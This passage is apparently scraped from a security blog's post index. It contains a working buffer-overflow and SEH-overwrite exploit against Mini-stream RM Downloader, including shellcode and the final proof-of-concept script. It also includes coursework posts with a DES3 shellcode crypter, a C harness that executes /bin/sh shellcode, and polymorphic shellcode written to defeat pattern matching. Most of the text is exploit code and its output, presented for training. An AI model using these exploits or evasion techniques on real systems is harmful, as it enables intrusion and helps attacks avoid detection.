b\"\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"buf += b\"\\x79\\x6c\\x48\\x68\\x6f\\x72\\x47\\x70\\x43\\x30\\x67\\x70\\x75\"buf += b\"\\x30\\x4e\\x69\\x48\\x65\\x55\\x61\\x59\\x50\\x51\\x74\\x4e\\x6b\"buf += b\"\\x32\\x70\\x64\\x70\\x4c\\x4b\\x73\\x62\\x36\\x6c\\x6e\\x6b\\x70\"buf += b\"\\x52\\x76\\x74\\x6e\\x6b\\x44\\x32\\x51\\x38\\x74\\x4f\\x4e\\x57\"buf += b\"\\x61\\x5a\\x65\\x76\\x76\\x51\\x49\\x6f\\x4c\\x6c\\x67\\x4c\\x35\"buf += b\"\\x31\\x51\\x6c\\x47\\x72\\x34\\x6c\\x45\\x70\\x4b\\x71\\x78\\x4f\"buf += b\"\\x44\\x4d\\x57\\x71\\x4b\\x77\\x49\\x72\\x39\\x62\\x42\\x72\\x53\"buf += b\"\\x67\\x6e\\x6b\\x70\\x52\\x62\\x30\\x6e\\x6b\\x53\\x7a\\x45\\x6c\"buf += b\"\\x4e\\x6b\\x52\\x6c\\x72\\x31\\x30\\x78\\x78\\x63\\x52\\x68\\x77\"buf += b\"\\x71\\x58\\x51\\x50\\x51\\x4c\\x4b\\x66\\x39\\x61\\x30\\x47\\x71\"buf += b\"\\x7a\\x73\\x6c\\x4b\\x77\\x39\\x47\\x68\\x5a\\x43\\x66\\x5a\\x51\"buf += b\"\\x59\\x4e\\x6b\\x47\\x44\\x6c\\x4b\\x66\\x61\\x39\\x46\\x65\\x61\"buf += b\"\\x69\\x6f\\x6c\\x6c\\x7a\\x61\\x7a\\x6f\\x44\\x4d\\x46\\x61\\x6a\"buf += b\"\\x67\\x36\\x58\\x79\\x70\\x63\\x45\\x49\\x66\\x65\\x53\\x53\\x4d\"buf += b\"\\x4c\\x38\\x37\\x4b\\x53\\x4d\\x71\\x34\\x51\\x65\\x59\\x74\\x51\"buf += b\"\\x48\\x6c\\x4b\\x53\\x68\\x67\\x54\\x45\\x51\\x6e\\x33\\x72\\x46\"buf += b\"\\x6e\\x6b\\x36\\x6c\\x72\\x6b\\x4c\\x4b\\x63\\x68\\x45\\x4c\\x45\"buf += b\"\\x51\\x6b\\x63\\x4c\\x4b\\x55\\x54\\x6c\\x4b\\x37\\x71\\x78\\x50\"buf += b\"\\x6e\\x69\\x50\\x44\\x55\\x74\\x75\\x74\\x73\\x6b\\x61\\x4b\\x45\"buf += b\"\\x31\\x63\\x69\\x53\\x6a\\x63\\x61\\x6b\\x4f\\x6d\\x30\\x71\\x4f\"buf += b\"\\x53\\x6f\\x52\\x7a\\x4e\\x6b\\x46\\x72\\x38\\x6b\\x4c\\x4d\\x73\"buf += b\"\\x6d\\x62\\x4a\\x73\\x31\\x4c\\x4d\\x6f\\x75\\x58\\x32\\x57\\x70\"buf += b\"\\x65\\x50\\x65\\x50\\x50\\x50\\x50\\x68\\x64\\x71\\x6e\\x6b\\x42\"buf += b\"\\x4f\\x4f\\x77\\x69\\x6f\\x6a\\x75\\x4d\\x6b\\x59\\x70\\x65\\x4d\"buf += b\"\\x55\\x7a\\x75\\x5a\\x75\\x38\\x6e\\x46\\x6d\\x45\\x4d\\x6d\\x4f\"buf += b\"\\x6d\\x69\\x6f\\x38\\x55\\x47\\x4c\\x65\\x56\\x33\\x4c\\x55\\x5a\"buf += b\"\\x6b\\x30\\x6b\\x4b\\x59\\x70\\x54\\x35\\x73\\x35\\x4f\\x4b\\x72\"buf += b\"\\x67\\x37\\x63\\x50\\x72\\x30\\x6f\\x70\\x6a\\x65\\x50\\x66\\x33\"buf += b\"\\x49\\x6f\\x6e\\x35\\x72\\x43\\x35\\x31\\x70\\x6c\\x33\\x53\\x64\"buf += b\"\\x6e\\x71\\x75\\x34\\x38\\x71\\x75\\x77\\x70\\x41\\x41\"pushesp = struct.pack(\"&lt;I\", 0x1003DF53) # 0x1003df53 : \"\\x54\\xC3\" | {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Program Files\\Mini-stream\\RM Downloader\\RDfilter03.dll)buffer = \"A\" * 8704 + pushesp + buf + \"\\xff\" * 200f = open (\"poc.txt\", \"w\")f.write(buffer)f.close()ResultsSEH OverwritesAs the Stack Overflows section has already been covered, it will now be proceeded to explain how alignments are performed within this scenario, which can be a little more complex, as the registers are not aligned by default.In order to perform the experiment, the same application will be used.Current poc:import struct nseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x10031779)buffer = \"A\" * 9008 + nseh + seh + \"\\x41\\x49\" * 5 + \"\\xff\" * 200f = open (\"poc.txt\", \"w\")f.write(buffer)f.close()Once the exploit is run, the payload is pasted and loaded, the debugger shows an interesting reaction:Checking the registers, none of them have the exact value, nor similar. Usually, when performing alignments in SEH Overwrites, the EAX register tends to be used, as it normally requires friendly characters, and is a non-volatile pointer as well.In order to perform the calculations as intended, it must be zeroed. The best way to do this, would be to copy the value of EDI, which is zero, to EAX. The instructions required for this operations would be PUSH EDI, POP EAX.Getting the opcodes for the operation with msf-nasm_shell:nasm &gt; PUSH EDI00000000 57 push edinasm &gt; POP EAX00000000 58 pop eaxnasm &gt; Once this is done, it is posible to proceed with the calculations.There are plenty of methods to align a register. However, a good one to start with would be copying the value of ESP to EAX. Furthermore, the address you desire EAX to be aligned is substracted to such register.Getting the opcodes for copying ESP to EAX.nasm &gt; PUSH ESP00000000 54 push espnasm &gt; POP EAX00000000 58 pop eaxnasm &gt; After the 4 bytes are positioned after the padding, the debugger reacts as intended:Note that ESP and EAX contain the same values.Once this is done, the next step would be to calculate the distance between a desired address, being on this case 0x000E2560, and the EAX value, which is 0x000E1EE4.In order to perform the calculation, the Windows calculator will be used:As seen, the value given by the calculator is 67C. In order to align the EAX value as intended, the 16-bits of the register will be modified (ax), adding the given value, so it lands to the address that was chosen:nasm &gt; add ax, 0x67c 00000000 66057C06 add ax,0x67cnasm &gt; With this last step, the alignment part finishes!Current poc:import struct alignment = \"\\x57\\x58\\x54\\x58\" # PUSH EDI, POP EAX / PUSH ESP, POP EAXalignment += \"\\x66\\x05\\x7C\\x06\" # add ax, 0x67cnseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x10031779)buffer = \"A\" * 9008 + nseh + seh + \"\\x41\\x49\" * 5 + alignment + \"\\xff\" * 200f = open (\"poc.txt\", \"w\")f.write(buffer)f.close()After repeating the explotation process, Immunity reveals that the alignment was processed successfully:However, the EIP register does not match EAX:Nonetheless, this matter has an easy solution, just parsing some small padding until the EIP reaches the same address as EAX should be enough. Furthermore, this won’t affect EAX, as it is a non-volatile register.Current poc:import struct alignment = \"\\x57\\x58\\x54\\x58\" # PUSH EDI, POP EAX / PUSH ESP, POP EAXalignment += \"\\x66\\x05\\x7C\\x06\" # add ax, 0x67cnseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x10031779)buffer = \"A\" * 9008 + nseh + seh + \"\\x41\\x49\" * 5 + alignment + \"\\x41\\x49\" * 11 + \"\\xff\" * 200f = open (\"poc.txt\", \"w\")f.write(buffer)f.close()After repeating the process, EIP and EAX seem to be aligned:Finally, shellcodeRepeating as the previous section, shellcode is generated with its respective flags, using EAX instead of ESP:root@whitecr0wz:~# msfvenom -p windows/messagebox TEXT='Thanks for reading the post! Until next time!' -f py -e x86/alpha_mixed EXITFUNC=thread BufferRegister=EAX [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 1 iterations of x86/alpha_mixedx86/alpha_mixed succeeded with size 668 (iteration=0)x86/alpha_mixed chosen with final size 668Payload size: 668 bytesFinal size of py file: 3255 bytesbuf = b\"\"buf += b\"\\x50\\x59\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\"buf += b\"\\x49\\x49\\x49\\x49\\x49\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\"buf += b\"\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\"buf += b\"\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"buf += b\"\\x68\\x59\\x48\\x6b\\x6f\\x6b\\x59\\x49\\x61\\x64\\x54\\x64\\x79\"buf += b\"\\x64\\x35\\x61\\x7a\\x72\\x4f\\x42\\x70\\x77\\x35\\x61\\x4f\\x39\"buf += b\"\\x55\\x34\\x6c\\x4b\\x74\\x31\\x46\\x50\\x4c\\x4b\\x52\\x56\\x44\"buf += b\"\\x4c\\x6c\\x4b\\x44\\x36\\x47\\x6c\\x6c\\x4b\\x32\\x66\\x37\\x78\"buf += b\"\\x6c\\x4b\\x61\\x6e\\x57\\x50\\x4c\\x4b\\x47\\x46\\x57\\x48\\x72\"buf += b\"\\x6f\\x54\\x58\\x34\\x35\\x79\\x63\\x73\\x69\\x43\\x31\\x4a\\x71\"buf += b\"\\x49\\x6f\\x39\\x71\\x31\\x70\\x4c\\x4b\\x42\\x4c\\x75\\x74\\x64\"buf += b\"\\x64\\x4e\\x6b\\x67\\x35\\x65\\x6c\\x4c\\x4b\\x33\\x64\\x64\\x68\"buf += b\"\\x52\\x58\\x53\\x31\\x48\\x6a\\x6e\\x6b\\x70\\x4a\\x77\\x68\\x4c\"buf += b\"\\x4b\\x51\\x4a\\x67\\x50\\x56\\x61\\x6a\\x4b\\x39\\x73\\x37\\x44\"buf += b\"\\x57\\x39\\x4e\\x6b\\x64\\x74\\x6c\\x4b\\x57\\x71\\x48\\x6e\\x35\"buf += b\"\\x61\\x6b\\x4f\\x65\\x61\\x79\\x50\\x49\\x6c\\x6c\\x6c\\x4c\\x44\"buf += b\"\\x39\\x50\\x53\\x44\\x45\\x57\\x4a\\x61\\x78\\x4f\\x44\\x4d\\x33\"buf += b\"\\x31\\x79\\x57\\x4a\\x4b\\x69\\x64\\x77\\x4b\\x33\\x4c\\x64\\x64\"buf += b\"\\x54\\x68\\x64\\x35\\x58\\x61\\x4e\\x6b\\x71\\x4a\\x47\\x54\\x57\"buf += b\"\\x71\\x68\\x6b\\x53\\x56\\x4e\\x6b\\x76\\x6c\\x70\\x4b\\x4e\\x6b\"buf += b\"\\x52\\x7a\\x75\\x4c\\x33\\x31\\x48\\x6b\\x4c\\x4b\\x65\\x54\\x6c\"buf += b\"\\x4b\\x45\\x51\\x69\\x78\\x4e\\x69\\x37\\x34\\x35\\x74\\x47\\x6c\"buf += b\"\\x43\\x51\\x48\\x43\\x6c\\x72\\x63\\x38\\x75\\x79\\x48\\x54\\x6c\"buf += b\"\\x49\\x4d\\x35\\x6c\\x49\\x79\\x52\\x73\\x58\\x6c\\x4e\\x62\\x6e\"buf += b\"\\x64\\x4e\\x6a\\x4c\\x51\\x42\\x58\\x68\\x6f\\x6f\\x79\\x6f\\x39\"buf += b\"\\x6f\\x49\\x6f\\x6d\\x59\\x37\\x35\\x73\\x34\\x4f\\x4b\\x7a\\x4f\"buf += b\"\\x68\\x4e\\x79\\x70\\x53\\x50\\x4d\\x57\\x75\\x4c\\x55\\x74\\x46\"buf += b\"\\x32\\x7a\\x48\\x4e\\x6e\\x49\\x6f\\x6b\\x4f\\x4b\\x4f\\x4c\\x49\"buf += b\"\\x72\\x65\\x43\\x38\\x62\\x48\\x42\\x4c\\x30\\x6c\\x77\\x50\\x73\"buf += b\"\\x71\\x62\\x48\\x77\\x43\\x65\\x62\\x34\\x6e\\x52\\x44\\x55\\x38\"buf += b\"\\x34\\x35\\x71\\x63\\x53\\x55\\x73\\x42\\x76\\x50\\x4b\\x6b\\x6f\"buf += b\"\\x78\\x53\\x6c\\x67\\x54\\x45\\x5a\\x6d\\x59\\x78\\x66\\x56\\x36\"buf += b\"\\x39\\x6f\\x50\\x55\\x54\\x44\\x6b\\x39\\x6a\\x62\\x46\\x30\\x6d\"buf += b\"\\x6b\\x6e\\x48\\x4e\\x42\\x30\\x4d\\x4f\\x4c\\x4d\\x57\\x47\\x6c\"buf += b\"\\x51\\x34\\x43\\x62\\x48\\x68\\x51\\x4f\\x39\\x6f\\x49\\x6f\\x39\"buf += b\"\\x6f\\x71\\x78\\x70\\x6f\\x64\\x38\\x61\\x48\\x61\\x30\\x55\\x38\"buf += b\"\\x43\\x51\\x50\\x67\\x52\\x45\\x62\\x62\\x61\\x78\\x32\\x6d\\x53\"buf += b\"\\x55\\x71\\x63\\x34\\x33\\x54\\x71\\x4b\\x6b\\x6d\\x58\\x53\\x6c\"buf += b\"\\x34\\x64\\x65\\x5a\\x4c\\x49\\x5a\\x43\\x65\\x38\\x65\\x71\\x56\"buf += b\"\\x38\\x67\\x50\\x77\\x50\\x43\\x58\\x54\\x34\\x42\\x49\\x42\\x4d\"buf += b\"\\x75\\x35\\x55\\x38\\x61\\x75\\x32\\x58\\x51\\x64\\x65\\x70\\x51\"buf += b\"\\x78\\x31\\x79\\x42\\x4c\\x71\\x30\\x30\\x6e\\x43\\x58\\x31\\x30\"buf += b\"\\x50\\x55\\x70\\x6e\\x63\\x44\\x55\\x38\\x50\\x6f\\x43\\x43\\x71\"buf += b\"\\x64\\x54\\x61\\x45\\x38\\x73\\x58\\x70\\x65\\x77\\x50\\x30\\x70\"buf += b\"\\x43\\x58\\x50\\x6e\\x31\\x77\\x61\\x30\\x70\\x74\\x61\\x78\\x35\"buf += b\"\\x35\\x55\\x31\\x61\\x74\\x65\\x39\\x53\\x58\\x50\\x6f\\x71\\x62\"buf += b\"\\x77\\x50\\x62\\x52\\x75\\x38\\x70\\x6b\\x53\\x43\\x75\\x70\\x51\"buf += b\"\\x76\\x32\\x48\\x36\\x34\\x55\\x38\\x50\\x61\\x72\\x4e\\x45\\x61\"buf += b\"\\x6a\\x69\\x6d\\x58\\x62\\x6c\\x74\\x64\\x46\\x4d\\x6b\\x39\\x49\"buf += b\"\\x71\\x36\\x51\\x39\\x42\\x33\\x62\\x66\\x33\\x53\\x61\\x50\\x52\"buf += b\"\\x6b\\x4f\\x48\\x50\\x30\\x31\\x6f\\x30\\x62\\x70\\x49\\x6f\\x42\"buf += b\"\\x75\\x34\\x48\\x41\\x41\"Final poc:import struct # msfvenom -p windows/messagebox TEXT='Thanks for reading the post! Until next time!' -f py -e x86/alpha_mixed EXITFUNC=thread BufferRegister=EAX# Payload size: 668 bytesbuf = b\"\"buf += b\"\\x50\\x59\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\"buf += b\"\\x49\\x49\\x49\\x49\\x49\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\"buf += b\"\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\"buf += b\"\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"buf += b\"\\x68\\x59\\x48\\x6b\\x6f\\x6b\\x59\\x49\\x61\\x64\\x54\\x64\\x79\"buf += b\"\\x64\\x35\\x61\\x7a\\x72\\x4f\\x42\\x70\\x77\\x35\\x61\\x4f\\x39\"buf += b\"\\x55\\x34\\x6c\\x4b\\x74\\x31\\x46\\x50\\x4c\\x4b\\x52\\x56\\x44\"buf += b\"\\x4c\\x6c\\x4b\\x44\\x36\\x47\\x6c\\x6c\\x4b\\x32\\x66\\x37\\x78\"buf += b\"\\x6c\\x4b\\x61\\x6e\\x57\\x50\\x4c\\x4b\\x47\\x46\\x57\\x48\\x72\"buf += b\"\\x6f\\x54\\x58\\x34\\x35\\x79\\x63\\x73\\x69\\x43\\x31\\x4a\\x71\"buf += b\"\\x49\\x6f\\x39\\x71\\x31\\x70\\x4c\\x4b\\x42\\x4c\\x75\\x74\\x64\"buf += b\"\\x64\\x4e\\x6b\\x67\\x35\\x65\\x6c\\x4c\\x4b\\x33\\x64\\x64\\x68\"buf += b\"\\x52\\x58\\x53\\x31\\x48\\x6a\\x6e\\x6b\\x70\\x4a\\x77\\x68\\x4c\"buf += b\"\\x4b\\x51\\x4a\\x67\\x50\\x56\\x61\\x6a\\x4b\\x39\\x73\\x37\\x44\"buf += b\"\\x57\\x39\\x4e\\x6b\\x64\\x74\\x6c\\x4b\\x57\\x71\\x48\\x6e\\x35\"buf += b\"\\x61\\x6b\\x4f\\x65\\x61\\x79\\x50\\x49\\x6c\\x6c\\x6c\\x4c\\x44\"buf += b\"\\x39\\x50\\x53\\x44\\x45\\x57\\x4a\\x61\\x78\\x4f\\x44\\x4d\\x33\"buf += b\"\\x31\\x79\\x57\\x4a\\x4b\\x69\\x64\\x77\\x4b\\x33\\x4c\\x64\\x64\"buf += b\"\\x54\\x68\\x64\\x35\\x58\\x61\\x4e\\x6b\\x71\\x4a\\x47\\x54\\x57\"buf += b\"\\x71\\x68\\x6b\\x53\\x56\\x4e\\x6b\\x76\\x6c\\x70\\x4b\\x4e\\x6b\"buf += b\"\\x52\\x7a\\x75\\x4c\\x33\\x31\\x48\\x6b\\x4c\\x4b\\x65\\x54\\x6c\"buf += b\"\\x4b\\x45\\x51\\x69\\x78\\x4e\\x69\\x37\\x34\\x35\\x74\\x47\\x6c\"buf += b\"\\x43\\x51\\x48\\x43\\x6c\\x72\\x63\\x38\\x75\\x79\\x48\\x54\\x6c\"buf += b\"\\x49\\x4d\\x35\\x6c\\x49\\x79\\x52\\x73\\x58\\x6c\\x4e\\x62\\x6e\"buf += b\"\\x64\\x4e\\x6a\\x4c\\x51\\x42\\x58\\x68\\x6f\\x6f\\x79\\x6f\\x39\"buf += b\"\\x6f\\x49\\x6f\\x6d\\x59\\x37\\x35\\x73\\x34\\x4f\\x4b\\x7a\\x4f\"buf += b\"\\x68\\x4e\\x79\\x70\\x53\\x50\\x4d\\x57\\x75\\x4c\\x55\\x74\\x46\"buf += b\"\\x32\\x7a\\x48\\x4e\\x6e\\x49\\x6f\\x6b\\x4f\\x4b\\x4f\\x4c\\x49\"buf += b\"\\x72\\x65\\x43\\x38\\x62\\x48\\x42\\x4c\\x30\\x6c\\x77\\x50\\x73\"buf += b\"\\x71\\x62\\x48\\x77\\x43\\x65\\x62\\x34\\x6e\\x52\\x44\\x55\\x38\"buf += b\"\\x34\\x35\\x71\\x63\\x53\\x55\\x73\\x42\\x76\\x50\\x4b\\x6b\\x6f\"buf += b\"\\x78\\x53\\x6c\\x67\\x54\\x45\\x5a\\x6d\\x59\\x78\\x66\\x56\\x36\"buf += b\"\\x39\\x6f\\x50\\x55\\x54\\x44\\x6b\\x39\\x6a\\x62\\x46\\x30\\x6d\"buf += b\"\\x6b\\x6e\\x48\\x4e\\x42\\x30\\x4d\\x4f\\x4c\\x4d\\x57\\x47\\x6c\"buf += b\"\\x51\\x34\\x43\\x62\\x48\\x68\\x51\\x4f\\x39\\x6f\\x49\\x6f\\x39\"buf += b\"\\x6f\\x71\\x78\\x70\\x6f\\x64\\x38\\x61\\x48\\x61\\x30\\x55\\x38\"buf += b\"\\x43\\x51\\x50\\x67\\x52\\x45\\x62\\x62\\x61\\x78\\x32\\x6d\\x53\"buf += b\"\\x55\\x71\\x63\\x34\\x33\\x54\\x71\\x4b\\x6b\\x6d\\x58\\x53\\x6c\"buf += b\"\\x34\\x64\\x65\\x5a\\x4c\\x49\\x5a\\x43\\x65\\x38\\x65\\x71\\x56\"buf += b\"\\x38\\x67\\x50\\x77\\x50\\x43\\x58\\x54\\x34\\x42\\x49\\x42\\x4d\"buf += b\"\\x75\\x35\\x55\\x38\\x61\\x75\\x32\\x58\\x51\\x64\\x65\\x70\\x51\"buf += b\"\\x78\\x31\\x79\\x42\\x4c\\x71\\x30\\x30\\x6e\\x43\\x58\\x31\\x30\"buf += b\"\\x50\\x55\\x70\\x6e\\x63\\x44\\x55\\x38\\x50\\x6f\\x43\\x43\\x71\"buf += b\"\\x64\\x54\\x61\\x45\\x38\\x73\\x58\\x70\\x65\\x77\\x50\\x30\\x70\"buf += b\"\\x43\\x58\\x50\\x6e\\x31\\x77\\x61\\x30\\x70\\x74\\x61\\x78\\x35\"buf += b\"\\x35\\x55\\x31\\x61\\x74\\x65\\x39\\x53\\x58\\x50\\x6f\\x71\\x62\"buf += b\"\\x77\\x50\\x62\\x52\\x75\\x38\\x70\\x6b\\x53\\x43\\x75\\x70\\x51\"buf += b\"\\x76\\x32\\x48\\x36\\x34\\x55\\x38\\x50\\x61\\x72\\x4e\\x45\\x61\"buf += b\"\\x6a\\x69\\x6d\\x58\\x62\\x6c\\x74\\x64\\x46\\x4d\\x6b\\x39\\x49\"buf += b\"\\x71\\x36\\x51\\x39\\x42\\x33\\x62\\x66\\x33\\x53\\x61\\x50\\x52\"buf += b\"\\x6b\\x4f\\x48\\x50\\x30\\x31\\x6f\\x30\\x62\\x70\\x49\\x6f\\x42\"buf += b\"\\x75\\x34\\x48\\x41\\x41\"alignment = \"\\x57\\x58\\x54\\x58\" # PUSH EDI, POP EAX / PUSH ESP, POP EAXalignment += \"\\x66\\x05\\x7C\\x06\" # add ax, 0x67cnseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x10031779)buffer = \"A\" * 9008 + nseh + seh + \"\\x41\\x49\" * 5 + alignment + \"\\x41\\x49\" * 11 + buf + \"\\xff\" * 200f = open (\"poc.txt\", \"w\")f.write(buffer)f.close()EndGame" }, { "title": "SLAE64 - Assignment 7 - Custom Crypter", "url": "/posts/Custom-Crypter/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-28 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.According to wikipedia, “In cryptography, encryption is the process of encoding information. This process converts the original representation of the information, known as plaintext, into an alternative form known as ciphertext. Ideally, only authorized parties can decipher a ciphertext back to plaintext and access the original information. Encryption does not itself prevent interference but denies the intelligible content to a would-be interceptor.”Today we are going to dive a little deep within Custom Encryption.The last assignment from the seven requires the creation of a Custom Encrypter, written in any language that can encrypt and decrypt shellcode.TheoryDuring the length of this post, the encryption schema employed will be DES3. Moreover, the language implemented shall be Python, with the use of the library pycrypto. In addition, I have decided to combine both the encrypter and decrypter in the same file, as a form of exercise.Even more so, the script does not hardcode the key, Initialization Vector (IV) nor shellcode! Making it quite dynamic.Finally, the crypter requires that the shellcode is a multiple of 8, therefore, in order to not harm the execution, a few NOPs are parsed.The Crypter# Author: SLAE64-27812 (Felipe Winsnes)from Crypto.Cipher import DES3import sysdef encrypt(): obj = DES3.new(sys.argv[2], DES3.MODE_CBC, sys.argv[3]) message = sys.stdin.read() ciphertext = obj.encrypt(message) crypted = \"\" for x in bytearray(ciphertext): crypted += '\\\\x' ciphertext = '%02x' % x crypted += ciphertext print ' ' print 'Encrypted shellcode in hex escape sequence:' print '\"' + crypted + '\"'def decrypt(): obj = DES3.new(sys.argv[2], DES3.MODE_CBC, sys.argv[3]) message = sys.stdin.read() decrypt = obj.decrypt(message) decrypted = \"\" for x in bytearray(decrypt): decrypted += '\\\\x' decrypt = '%02x' % x decrypted += decrypt print ' ' print 'Original shellcode in hex escape sequence:' print '\"' + (decrypted) + '\"'if len(sys.argv) != 4: print \"[*] Example: echo -ne &lt;shellcode between quotes&gt; | python \" + sys.argv[0] + \" --encrypt &lt;key&gt; &lt;IV number&gt;\" print \"[*] Example: echo -ne &lt;shellcode between quotes&gt; | python \" + sys.argv[0] + \" --decrypt &lt;key&gt; &lt;IV number&gt;\" + \"\\r\\n\" sys.exit(1)if sys.argv[1] == \"--encrypt\": encrypt() sys.exit(1)if sys.argv[1] == \"--decrypt\": decrypt() sys.exit(1)EncryptionIn order to test the aforementioned tool, a simple /bin/sh exceve shellcode will be employed. Furthermore, the key may be scvr3BbPZ9cQ2ETYG5H2qYar, with the IV being 67sACHcv.whitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$ python crypter.py [*] Example: echo -ne &lt;shellcode between quotes&gt; | python crypter.py --encrypt &lt;key&gt; &lt;IV number&gt;[*] Example: echo -ne &lt;shellcode between quotes&gt; | python crypter.py --decrypt &lt;key&gt; &lt;IV number&gt;whitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$ echo -ne \"\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xdb\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x90\\x90\\x90\\x90\" | python crypter.py --encrypt scvr3BbPZ9cQ2ETYG5H2qYar 67sACHcv Encrypted shellcode in hex escape sequence:\"\\x57\\x65\\xc2\\x9e\\x96\\x68\\x5a\\x91\\xca\\xb4\\x78\\xb3\\xde\\xe5\\x8b\\x35\\xab\\x62\\xf1\\xb1\\x47\\x22\\x07\\x01\\xc8\\x28\\x91\\x3e\\xd5\\x44\\xbe\\x72\\x14\\x53\\xec\\xd5\\x8e\\xdb\\x8c\\xc3\"whitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$DecryptionThe process of decryption is quite simple.whitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$ python crypter.py [*] Example: echo -ne &lt;shellcode between quotes&gt; | python crypter.py --encrypt &lt;key&gt; &lt;IV number&gt;[*] Example: echo -ne &lt;shellcode between quotes&gt; | python crypter.py --decrypt &lt;key&gt; &lt;IV number&gt;whitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$ echo -ne \"\\x57\\x65\\xc2\\x9e\\x96\\x68\\x5a\\x91\\xca\\xb4\\x78\\xb3\\xde\\xe5\\x8b\\x35\\xab\\x62\\xf1\\xb1\\x47\\x22\\x07\\x01\\xc8\\x28\\x91\\x3e\\xd5\\x44\\xbe\\x72\\x14\\x53\\xec\\xd5\\x8e\\xdb\\x8c\\xc3\" | python crypter.py --decrypt scvr3BbPZ9cQ2ETYG5H2qYar 67sACHcv Original shellcode in hex escape sequence:\"\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xdb\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x90\\x90\\x90\\x90\"whitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$C format#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xdb\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x90\\x90\\x90\\x90\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGamewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$ gcc decrypted_shellcode.c -o decrypted_shellcode -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_7$ ./decrypted_shellcode Shellcode Length: 40$CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/.Student ID: SLAE64-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 6 - Polymorphic Shellcode", "url": "/posts/SLAE64-Polymorphic/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-27 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.According to wikipedia, “Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations.”. This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands!The sixth assignment from the seven requires taking three shellcodes from shell-storm.org and generate polymorphic versions of such. In addition, its size should not be bigger than 150%.Execve Shellcode (Shellcode #1)The first shellcode from the three will be one that executes /bin/sh through the execve syscall. It can be found here.Original code section .text global _start _start: xor rdx, rdx mov qword rbx, '//bin/sh' shr rbx, 0x8 push rbx mov rdi, rsp push rax push rdi mov rsi, rsp mov al, 0x3b syscallThere are infinite ways to modify such shellcode. For instance, “NOP equivalents” could be used, which add no functionality whatsoever and difficult pattern matching.Final code:global _start_start: cmc ; Garbage NOP cdq ; Garbage NOP mov qword rbx, '//bin/sh' shr rbx, 0x8 xor rsi, rsi ; Garbage NOP clc ; Garbage NOP push rbx mov rdi, rsp dec rbp ; Garbage NOP push rax mul rbp ; Garbage NOP push rdi lea r10, [rsi - 62] ; Garbage NOP mov rsi, rsp mul r12 ; Garbage NOP lea r9, [rbp + 9] ; Garbage NOP mov cl, 27 ; Garbage NOP push word 0x20 ; Pushes 0x20 into the stack. pop bx ; Pops this value into BX. mov al, bl ; The value in BL is copied into AL. add al, 0x1b ; As the value of AL is now 0x20, adding 0x1B will set its value to 0x3B, which is the execve syscall value. syscallLet’s dump the shellcode and test it!whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/1_shellcode$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d ./1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echo 